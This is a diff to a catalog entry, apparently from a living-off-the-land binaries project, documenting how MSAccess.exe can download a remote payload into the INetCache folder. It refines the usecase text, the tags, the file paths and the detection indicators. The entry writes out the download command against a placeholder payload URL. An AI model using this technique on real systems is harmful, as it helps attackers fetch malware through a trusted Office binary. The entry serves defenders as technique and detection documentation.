@@ -6,11 +6,13 @@ Created: 2023-04-30
 Commands:
   - Command: MSAccess.exe https://example.com/payload.exe.mdb
     Description: Downloads payload from remote server
-    Usecase: It will download a remote payload (if it has the filename extension .mdb) and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\Content.MSO). After downloading the file - need to delete the .mdb extension from the name of the file.
+    Usecase: It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache.
     Category: Download
     Privileges: User
     MitreID: T1105
-    OperatingSystem: Windows 10, Windows 11
+    OperatingSystem: Windows
+    Tags:
+      - Download: INetCache
 Full_Path:
   - Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSAccess.exe
   - Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSAccess.exe
@@ -26,9 +28,9 @@ Full_Path:
   - Path: C:\Program Files\Microsoft Office\Office14\MSAccess.exe
   - Path: C:\Program Files (x86)\Microsoft Office\Office12\MSAccess.exe
   - Path: C:\Program Files\Microsoft Office\Office12\MSAccess.exe
-  - Path: C:\Program Files\Microsoft Office\Office12\MSAccess.exe
 Detection:
-  - IOC: Suspicious Office application internet/network traffic
+  - IOC: URL on a MSAccess command line
+  - IOC: MSAccess making unexpected network connections or DNS requests
 Acknowledgement:
-  - Person: Nir Chako (Pentera)
+  - Person: Nir Chako
     Handle: '@C_h4ck_0'
